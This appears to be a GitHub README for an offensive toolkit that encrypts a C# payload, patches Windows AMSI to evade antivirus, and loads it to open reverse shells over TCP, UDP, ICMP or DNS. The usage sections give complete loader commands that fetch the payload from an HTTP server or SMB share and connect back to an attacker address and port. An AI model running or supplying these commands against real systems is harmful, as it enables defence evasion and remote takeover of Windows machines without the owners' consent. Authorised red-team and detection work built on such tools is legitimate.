![License](https://img.shields.io/badge/license-GNU-green.svg?style=flat-square)

# **Salsa Tools - ShellReverse**
## **TCP/UDP/ICMP/ DNS and AV bypass, AMSI patched**

```
   _____       __              ______            __    
  / ___/____ _/ /________ _   /_  __/___  ____  / /____
  \__ \/ __ `/ / ___/ __ `/    / / / __ \/ __ \/ / ___/
 ___/ / /_/ / (__  ) /_/ /    / / / /_/ / /_/ / (__  ) 
/____/\__,_/_/____/\__,_/    /_/  \____/\____/_/____/  
                                                       

 [+] Starting the fucking Salsa...
 [+] EncrypterAssembly (Software to encrypt our payload)
 [+] EvilSalsa (This is our payload)
 [+] SalseoLoader (Software that we will use to load our encrypted payload)
```
Salsa Toos is a set of tools written in C #  
that allows you to have a shellreverse in any windows environment without the need of powershell for it's execution.  


```
  ______                             _            
 |  ____|                           | |           
 | |__   _ __   ___ _ __ _   _ _ __ | |_ ___ _ __ 
 |  __| | '_ \ / __| '__| | | | '_ \| __/ _ \ '__|
 | |____| | | | (__| |  | |_| | |_) | ||  __/ |   
 |______|_| |_|\___|_|   \__, | .__/ \__\___|_|   
     /\                   __/ | || |   | |        
    /  \   ___ ___  ___ _|___/|_|| |__ | |_   _   
   / /\ \ / __/ __|/ _ \ '_ ` _ \| '_ \| | | | |  
  / ____ \\__ \__ \  __/ | | | | | |_) | | |_| |  
 /_/    \_\___/___/\___|_| |_| |_|_.__/|_|\__, |  
                                           __/ |  
                                          |___/   
			  
 [+] Software that encrypts the payload using RC4
 [+] We have the version in python and the version in .exe
```
## Usage EncrypterAssembly in python

```
python encrypterassembly.py <FILE> <PASSWORD> <OUTPUT>
```

## Usage EncrypterAssembly in .EXE

```
Encrypterassembly.exe <FILE> <PASSWORD> <OUTPUT>
```
![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/encrypterpython.png)

```
   ___ __ __  ____  _            
  /  _]  |  ||    || |           
 /  [_|  |  | |  | | |           
|    _]  |  | |  | | |___        
|   [_|  :  | |  | |     |       
|     |\   /  |  | |     |       
|_____| \_/  |____||_____|       
                                 
  _____  ____  _     _____  ____ 
 / ___/ /    || |   / ___/ /    |
(   \_ |  o  || |  (   \_ |  o  |
 \__  ||     || |___\__  ||     |
 /  \ ||  _  ||     /  \ ||  _  |
 \    ||  |  ||     \    ||  |  |
  \___||__|__||_____|\___||__|__|
  
[+] That is our Payload
                                 
```
## Description

EvilSalsa is our payload. Basically what we do is load the System.Management.Automation .dll. Create a runspace and within that runspaces we have four types of shells (TCP / UDP / ICMP / DNS). When the EvilSalsa is loaded into the system, the first thing it does is to check if "c:\windows\system32\amsi.dll" is found in the system. If it is in the system, it is patched: D. Patching is a patch variant of CyberArk and Rastamouse.

AMSI Bypass Redux (CyberArk) https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/  
AMSI Bypass (Rastamouse) https://rastamouse.me/2018/11/amsiscanbuffer-bypass---part-3/  


```
  _____  ____  _     _____   ___   ___    
 / ___/ /    || |   / ___/  /  _] /   \   
(   \_ |  o  || |  (   \_  /  [_ |     |  
 \__  ||     || |___\__  ||    _]|  O  |  
 /  \ ||  _  ||     /  \ ||   [_ |     |  
 \    ||  |  ||     \    ||     ||     |  
  \___||__|__||_____|\___||_____| \___/   
                                          
 _       ___    ____  ___      ___  ____  
| |     /   \  /    ||   \    /  _]|    \ 
| |    |     ||  o  ||    \  /  [_ |  D  )
| |___ |  O  ||     ||  D  ||    _]|    / 
|     ||     ||  _  ||     ||   [_ |    \ 
|     ||     ||  |  ||     ||     ||  .  \
|_____| \___/ |__|__||_____||_____||__|\_|

[+] This software is the one that we will use to load the encrypted payload
```

## Description

This software is the one that we will use to load the encrypted payload. SalseoLoader can be compiled as a library or as an executable. In the case that it is compiled as executable, we must only pass the argument that we want to execute. On the contrary, if we compile it as a library. We will have to make an export of the descriptor "main". And the way to create the argument, is done through the reading of environmental variables.

# Usage SalseoLoader
```
SalseoLoader.exe <PASSWORD> <PAYLOAD PATH> <SHELL TYPE> <LHOST> <LPORT>
```

## Usage SalseoLoader in .EXE reading from web server.
## Example ReverseUDP
```
SalseoLoader.exe hc0n-2019 http://192.168.1.235/elmal.txt reverseudp 192.168.1.235 1337
```
![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example1.png)

## Usage SalseoLoader in .EXE reading from local file.
## Example ReverseTCP
```
SalseoLoader.exe hc0n-2019 C:\elmal.txt reversetcp 192.168.1.235 1337
```
![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example2.png)


## Usage SalseoLoader in .EXE reading from SMB file.
## Example ReverseICMP
```
SalseoLoader.exe hc0n-2019 \\192.168.1.235\evil\elmal.txt reverseicmp 192.168.1.235 
```
![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example3.png)

## Usage SalseoLoader 
## Example ReverseDNS
```
SalseoLoader.exe hc0n-2019 C:\elmal.txt reversedns 192.168.1.235 licordebellota.org
```

![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example4.png)

